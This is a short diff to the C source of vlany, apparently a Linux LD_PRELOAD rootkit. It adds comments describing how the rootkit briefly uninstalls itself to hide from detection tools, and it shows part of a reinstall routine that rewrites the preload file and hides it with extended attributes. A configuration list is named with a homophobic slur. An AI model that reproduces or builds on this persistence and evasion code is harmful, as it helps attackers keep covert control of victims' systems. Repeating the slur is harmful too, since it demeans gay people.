@@ -1,3 +1,7 @@
+// These functions handle vlany's temporary uninstallation to hide from certain utilities
+// There's a list in config.py called GAY_PROCS which has a list of names of binaries/processes/environment variables.
+// execve.c uses this list to uninstall vlany whenever a certain string is found
+
 void reinstall(void)
 {
     #ifdef DEBUG
@@ -36,7 +40,7 @@ void reinstall(void)
             fflush(preload); fclose(preload);
         }
 
-        // ld.so.preload was removed somehow, now we need to rehide it
+        // the preload file was removed somehow, now we need to hide it again
         char xattr_user[256];
         char *hidden_xattr_1_str = strdup(HIDDEN_XATTR_1_STR);
         char *hidden_xattr_2_str = strdup(HIDDEN_XATTR_2_STR);
